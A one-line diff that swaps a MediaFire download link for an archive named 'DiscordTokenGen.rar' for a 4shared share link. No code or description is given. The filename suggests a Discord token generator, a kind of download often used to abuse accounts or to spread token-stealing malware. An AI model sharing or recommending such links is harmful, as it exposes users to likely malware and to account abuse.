@@ -1,2 +1,1 @@
-
-https://www.mediafire.com/file/emrwmi6fyztlwus/DiscordTokenGen.rar/file
+https://www.4shared.com/s/fkBdgdl_Sku
